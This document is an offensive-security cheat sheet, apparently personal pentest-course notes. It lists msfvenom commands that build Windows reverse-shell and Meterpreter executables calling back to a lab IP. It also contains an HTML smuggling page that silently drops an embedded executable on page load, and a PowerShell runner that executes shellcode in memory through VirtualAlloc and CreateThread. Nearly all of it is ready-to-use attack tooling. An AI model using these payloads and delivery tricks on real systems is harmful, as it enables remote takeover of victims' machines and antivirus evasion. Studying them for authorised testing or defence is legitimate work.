### RevShell
```ruby
sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=444 -f exe -o /var/www/html/shell.exe
```

### non-staged
```ruby
sudo msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/msfnonstaged.exe
```

### staged
```ruby
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/msfstaged.exe
```

### Base64 Payload
```ruby
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/msfstaged.exe
```

```
base64 /var/www/html/msfstaged.exe
```

Using the payload with HTML Smuggling
```java
<html>
    <body>
        <script>
          function base64ToArrayBuffer(base64) {
    		  var binary_string = window.atob(base64);
    		  var len = binary_string.length;
    		  var bytes = new Uint8Array( len );
    		  for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
    		  return bytes.buffer;
      		}
      		
      		var file ='TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA...
      		var data = base64ToArrayBuffer(file);
      		var blob = new Blob([data], {type: 'octet/stream'});
      		var fileName = 'msfstaged.exe';
      		
      		var a = document.createElement('a');
      		document.body.appendChild(a);
      		a.style = 'display: none';
      		var url = window.URL.createObjectURL(blob);
      		a.href = url;
      		a.download = fileName;
      		a.click();
      		window.URL.revokeObjectURL(url);
        </script>
    </body>
</html>
```

### Shellcode
vb application
```ruby
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication
```

powershell
```powershell
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
```

shellcode runner in powershell
```powershell
# Define the Kernel32 class with the necessary Win32 API functions.
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
        uint flAllocationType, uint flProtect);
        
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
            uint dwCreationFlags, IntPtr lpThreadId);
            
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
        UInt32 dwMilliseconds);
}
"@

# Compile the Kernel32 class so we can call its functions.
Add-Type $Kernel32

# Shellcode generated previously (insert the full shellcode bytes here).
[Byte[]] $buf = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26  # … continue with your full shellcode bytes

# Determine the size of the shellcode.
$size = $buf.Length

# Allocate executable memory for the shellcode.
[IntPtr] $addr = [Kernel32]::VirtualAlloc(0, $size, 0x3000, 0x40)

# Copy the shellcode into the allocated memory.
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

# Create a thread that starts executing the shellcode.
$thandle = [Kernel32]::CreateThread(0, 0, $addr, 0, 0, 0)

# Wait indefinitely for the shellcode thread to complete.
[Kernel32]::WaitForSingleObject($thandle, [uint32]0xFFFFFFFF)

```